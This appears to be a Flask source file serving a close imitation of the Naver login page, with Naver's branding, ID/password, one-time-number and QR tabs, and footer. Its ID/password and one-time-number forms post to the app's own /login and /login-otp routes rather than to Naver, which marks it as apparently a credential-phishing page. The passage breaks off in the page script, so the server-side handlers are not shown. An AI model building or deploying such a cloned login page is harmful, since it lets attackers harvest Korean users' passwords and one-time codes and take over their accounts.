from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

# HTML 문자열 통합 (JS와 CSS 모두 포함)
login_html = """<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>네이버 : 로그인</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Malgun Gothic','맑은 고딕',sans-serif; background-color:#f5f6f7; color:#333; }
a { text-decoration:none; }
.lang-selector { position:absolute; top:15px; right:20px; }
.header { padding:60px 0 40px; text-align:center; }
.main-container { display:flex; flex-direction:column; align-items:center; max-width:460px; margin:0 auto; padding:0 20px; }
.login-container { width:100%; background:white; border:1px solid #e5e5e5; margin-bottom:30px; }
.footer { text-align:center; padding:20px; font-size:11px; color:#999; }
.naver-logo { font-size:48px; font-weight:bold; color:#00c73c; letter-spacing:-1px; }
.lang-btn { background:white; border:1px solid #d3d3d3; padding:6px 10px; border-radius:3px; color:#666; cursor:pointer; font-size:12px; }
.login-tabs { display:flex; background:#f8f9fa; }
.tab { flex:1; padding:15px; text-align:center; background:none; border:none; cursor:pointer; font-size:13px; color:#8b95a1; border-right:1px solid #e5e5e5; position:relative; }
.tab:last-child { border-right:none; }
.tab.active { background:white; color:#333; font-weight:600; }
.tab.active::after { content:''; position:absolute; bottom:0; left:0; width:100%; height:2px; background:#00c73c; }
.tab-icon { margin-right:4px; font-size:14px; }
.login-form { padding:30px; }
.input-group { margin-bottom:12px; }
.form-input { width:100%; height:50px; border:1px solid #dadada; border-radius:6px; padding:0 14px; font-size:16px; outline:none; }
.form-input:focus { border-color:#00c73c; }
.form-input::placeholder { color:#999; font-size:15px; }
.login-options { display:flex; align-items:center; justify-content:space-between; margin:18px 0 25px; font-size:13px; }
.keep-login { display:flex; align-items:center; cursor:pointer; }
.custom-checkbox { width:18px; height:18px; border:1px solid #dadada; border-radius:2px; margin-right:7px; position:relative; background:white; }
.custom-checkbox.checked { background:#00c73c; border-color:#00c73c; }
.custom-checkbox.checked::after { content:'✓'; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:white; font-size:14px; font-weight:bold; }
.keep-login-text { color:#666; }
.ip-security { display:flex; align-items:center; color:#666; }
.ip-toggle { margin-left:6px; width:35px; height:18px; background:#dadada; border:none; border-radius:9px; position:relative; cursor:pointer; transition:0.2s; }
.ip-toggle::before { content:''; position:absolute; top:1px; left:1px; width:16px; height:16px; background:white; border-radius:50%; transition:0.2s; }
.ip-toggle.on { background:#00c73c; }
.ip-toggle.on::before { transform:translateX(17px); }
.off-text { color:#999; font-size:11px; margin-left:4px; }
.login-btn { width:100%; height:50px; background:#adadad; border:none; border-radius:6px; color:white; font-size:17px; font-weight:bold; cursor:not-allowed; margin-bottom:15px; }
.login-btn.enabled { background:#00c73c; cursor:pointer; }
.passkey-btn { width:100%; height:50px; background:transparent; border:1px solid #00c73c; border-radius:6px; color:#00c73c; font-size:16px; font-weight:500; cursor:pointer; margin-top:15px; }
.sub-links { text-align:center; font-size:13px; color:#666; }
.sub-links a { color:#666; margin:0 5px; }
.promotion { width:100%; background:linear-gradient(135deg,#e8f3ff 0%,#f0ebff 100%); padding:28px 25px; border-radius:12px; position:relative; overflow:hidden; margin:25px 0 40px; }
.promotion-content { position:relative; z-index:2; }
.promotion-main { font-size:24px; font-weight:bold; color:#333; line-height:1.2; margin-bottom:8px; }
.promotion-sub { display:flex; align-items:center; font-size:13px; color:#666; }
.points-label { background:#333; color:white; padding:2px 5px; border-radius:2px; margin-left:6px; font-size:11px; font-weight:bold; }
.promotion-graphic { position:absolute; right:20px; top:50%; transform:translateY(-50%); width:110px; height:75px; background:linear-gradient(45deg,#ff6b9d,#c44569); border-radius:10px; display:flex; flex-direction:column; align-items:center; justify-content:center; box-shadow:0 4px 12px rgba(0,0,0,0.15); }
.graphic-icon { color:white; font-size:24px; margin-bottom:3px; }
.graphic-text { color:white; font-size:11px; font-weight:bold; text-align:center; line-height:1.2; }
.graphic-emojis { position:absolute; bottom:-8px; right:-8px; font-size:18px; }
.footer-nav { margin-bottom:12px; }
.footer-nav a { color:#999; margin:0 12px; }
.copyright { display:flex; align-items:center; justify-content:center; }
.naver-logo-footer { color:#00c73c; font-weight:bold; margin-right:4px; }
</style>
</head>
<body>
<div class="lang-selector"><button class="lang-btn">한국어 ⌄</button></div>
<header class="header"><div class="naver-logo">NAVER</div></header>
<div class="main-container">
<div class="login-container">
<div class="login-tabs">
<button class="tab active" data-form="idForm"><span class="tab-icon">👤</span>ID 로그인</button>
<button class="tab" data-form="otpForm"><span class="tab-icon">🔢</span>일회용 번호</button>
<button class="tab" data-form="qrForm"><span class="tab-icon">📱</span>QR코드</button>
</div>

<!-- ID 로그인 폼 -->
<div class="login-form" id="idForm">
<form action="/login" method="POST" id="loginForm">
<div class="input-group"><input type="text" name="userId" class="form-input" placeholder="아이디" id="userId"></div>
<div class="input-group"><input type="password" name="userPw" class="form-input" placeholder="비밀번호" id="userPw"></div>
<div class="login-options">
<div class="keep-login" onclick="toggleKeepLogin()">
<div class="custom-checkbox" id="keepLoginCheck"></div>
<span class="keep-login-text">로그인 상태 유지</span>
</div>
<div class="ip-security">
IP보안
<button type="button" class="ip-toggle" id="ipToggle"></button>
<span class="off-text">OFF</span>
</div>
</div>
<button type="submit" class="login-btn" id="loginBtn">로그인</button>
</form>
</div>

<!-- OTP 로그인 폼 -->
<div class="login-form" id="otpForm" style="display:none;">
<p style="text-align:center; color:#666; margin-bottom:20px; font-size:14px;">네이버 앱의 '메뉴 &gt; 설정 &gt; 로그인 아이디 관리'에서 일회용 로그인 번호 확인</p>
<form action="/login-otp" method="POST" id="otpLoginForm">
<div class="input-group"><input type="text" name="otp" class="form-input" placeholder="번호 입력" id="otpInput" maxlength="8"></div>
<button type="submit" class="login-btn" id="otpBtn">로그인</button>
</form>
</div>

<!-- QR코드 폼 -->
<div class="login-form" id="qrForm" style="display:none; text-align:center;">
<p style="font-size:16px; color:#333; margin-bottom:15px;">QR코드 로그인을 사용해보세요</p>
<p style="font-size:13px; color:#666;">네이버 앱을 열고 QR코드를 스캔하세요.</p>
</div>

<div class="sub-links" style="padding:0 30px 30px;">
<a href="#">비밀번호 찾기</a> · <a href="#">아이디 찾기</a> · <a href="#">회원가입</a>
<button class="passkey-btn">패스키로 더 안전하게 로그인</button>
</div>
</div>

<div class="promotion">
<div class="promotion-content">
<div class="promotion-main">여행 가서 포인트 쌓아 즐기자!</div>
<div class="promotion-sub">항공권/숙소 예약 시 <span class="points-label">포인트 적립</span></div>
</div>
<div class="promotion-graphic">
<div class="graphic-icon">✈️</div>
<div class="graphic-text">NAVER TRAVEL</div>
<div class="graphic-emojis">🌴☀️</div>
</div>
</div>

<footer class="footer">
<div class="footer-nav">
<a href="#">이용약관</a>
<a href="#"><strong>개인정보처리방침</strong></a>
<a href="#">책임의 한계와 법적고지</a>
<a href="#">회원정보 고객센터</a>
</div>
<div class="copyright">
<span class="naver-logo-footer">NAVER</span>
Copyright © NAVER Corp. All Rights Reserved.
</div>
</footer>
</div>

<script>
// 탭 전환
const tabs = document.querySelectorAll('.tab');
const forms = document.querySelectorAll('.login-form');
tabs.forEach(tab => {
tab.addEventListener('click', () =>